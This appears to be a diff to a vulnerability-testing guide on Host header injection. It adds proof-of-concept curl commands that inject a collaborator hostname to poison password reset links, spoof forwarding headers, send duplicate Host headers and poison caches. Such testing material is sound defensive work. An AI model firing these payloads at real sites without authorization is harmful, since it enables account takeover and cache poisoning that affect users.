@@ -55,6 +55,58 @@ Path-problem from remote sources to email composition APIs. Distinct from host p
 
 Manual patterns: `ServletRequest.getServerName()`, Flask `request.host`, Django `request.get_host()` in reset emails
 
+## Dynamic Test / PoC
+
+**Password reset poisoning** — inject attacker hostname into reset link:
+
+```bash
+curl -X POST https://TARGET/forgot-password \
+  -H "Host: YOUR-COLLABORATOR.oast.fun" \
+  -d "email=victim@example.com"
+
+curl -X POST https://TARGET/forgot-password \
+  -H "X-Forwarded-Host: YOUR-COLLABORATOR.oast.fun" \
+  -d "email=victim@example.com"
+```
+
+Confirmed when the reset email or link contains the injected hostname.
+
+**Host override variants** — probe reflection or routing changes:
+
+```bash
+curl -s https://TARGET/ -H "Host: YOUR-COLLABORATOR.oast.fun"
+curl -s https://TARGET/ -H "X-Forwarded-Host: YOUR-COLLABORATOR.oast.fun"
+curl -s https://TARGET/ -H "X-Host: YOUR-COLLABORATOR.oast.fun"
+curl -s https://TARGET/ -H "X-Forwarded-Server: YOUR-COLLABORATOR.oast.fun"
+```
+
+**Duplicate / malformed Host** — some stacks honor the second header or mangle authority:
+
+```bash
+curl https://TARGET/ \
+  -H "Host: TARGET" \
+  -H "Host: YOUR-COLLABORATOR.oast.fun"
+
+curl https://TARGET/ -H "Host: TARGET:@YOUR-COLLABORATOR.oast.fun"
+```
+
+**Absolute-URI line** — request line authority can override Host on some proxies:
+
+```http
+GET https://internal-admin.TARGET/ HTTP/1.1
+Host: TARGET
+```
+
+**Cache poisoning via Host** — if response reflects injected host and is cached:
+
+```bash
+curl -s https://TARGET/ \
+  -H "X-Forwarded-Host: YOUR-COLLABORATOR.oast.fun" -D- | grep -i x-cache
+curl -s https://TARGET/ | grep "YOUR-COLLABORATOR.oast.fun"
+```
+
+A follow-up request without the injected header still serving the attacker domain confirms cache poisoning (see `web_cache_deception.md`).
+
 ## Common False Alarms
 
 - `Host` used only for logging, not for security-sensitive link generation
